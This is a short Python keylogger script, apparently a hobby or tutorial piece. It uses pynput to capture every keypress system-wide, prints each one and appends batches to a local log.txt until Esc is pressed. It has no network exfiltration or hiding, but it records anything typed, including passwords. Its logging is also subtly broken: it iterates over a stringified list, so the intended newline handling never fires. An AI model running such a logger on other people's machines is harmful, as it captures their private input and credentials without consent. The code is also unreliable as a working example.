import pynput
from pynput.keyboard import Key, Listener

count = 0
keys = []

def on_press(key):
    global keys, count

    keys.append(key)
    count += 1

    print('{0} pressed'.format(key))

    if count >= 4:
        count = 0
        write_file(str(keys))
        keys = []

def on_release(key):
    if key == Key.esc:
        return False
    
def write_file(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'","")

            output = ''.join(k)
            output = output.replace('[', '').replace(']', '')

            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(output)


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()